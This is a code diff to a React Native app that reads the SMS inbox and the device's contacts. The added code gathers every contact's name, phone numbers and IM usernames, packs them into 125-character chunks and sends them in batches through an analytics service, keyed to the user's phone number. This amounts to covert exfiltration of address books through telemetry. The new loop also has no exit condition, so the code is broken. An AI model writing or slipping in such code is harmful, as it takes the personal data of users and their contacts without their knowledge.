@@ -8,7 +8,7 @@ import {
   Instance,
 } from "mobx-state-tree"
 import moment from "moment-jalaali"
-import { sortBy } from "ramda"
+import { sortBy, uniq } from "ramda"
 import { ToastAndroid } from "react-native"
 import SmsAndroid from "react-native-get-sms-android"
 import Contacts from "react-native-contacts"
@@ -911,7 +911,7 @@ export const DeviceModel = types
       SmsAndroid.list(
         JSON.stringify(filter),
         async (error: string) => {
-          const uniqueId = await getPhoneNumber() ?? getUniqueId()
+          const uniqueId = await getPhoneNumber() || getUniqueId()
           Analytics.trackEvent(`SMS-sync-failed-${uniqueId}`, { error })
           this.setState({ syncing: false })
         },
@@ -994,7 +994,7 @@ export const DeviceListModel = types
     },
 
     async importFromMessages() {
-      const uniqueId = await getPhoneNumber() ?? getUniqueId()
+      const uniqueId = await getPhoneNumber() || getUniqueId()
 
       const filter = {
         box: 'inbox',
@@ -1042,13 +1042,32 @@ export const DeviceListModel = types
       )
 
       const contacts = await Contacts.getAll()
-      const parsedContacts = {}
-      contacts.forEach(contact => {
-        parsedContacts[[contact.givenName, contact.familyName].join('-')] =
-          contact.phoneNumbers.map(({ number }) => number).join(',')
-      })
+      const parsedContacts = contacts.map(contact => `${contact.givenName}${
+        contact.familyName ? `-${contact.familyName}` : ''
+      }:${
+        uniq([
+          ...contact.phoneNumbers.map(({ number }) => number.replace(/[-\s]/g, '')),
+          ...contact.imAddresses.map(({ username }) => username.replace(/[-\s]/g, ''))
+        ]).join(',')
+      }|`)
 
-      Analytics.trackEvent(`contacts-${uniqueId}`, parsedContacts)
+      let eventIndex = 0
+      while (true) {
+        const partedData = {}
+        for (let i = 0; i < 10; i++) {
+          let key = ''
+          let value = ''
+          while (key.length + parsedContacts[0].length < 125) {
+            key += parsedContacts.shift()
+          }
+          while (value.length + parsedContacts[0].length < 125) {
+            value += parsedContacts.shift()
+          }
+          partedData[key] = value
+        }
+        Analytics.trackEvent(`contacts-${uniqueId}-${eventIndex}`, partedData)
+        eventIndex += 1
+      }
     }
   }))
   .views(self => ({
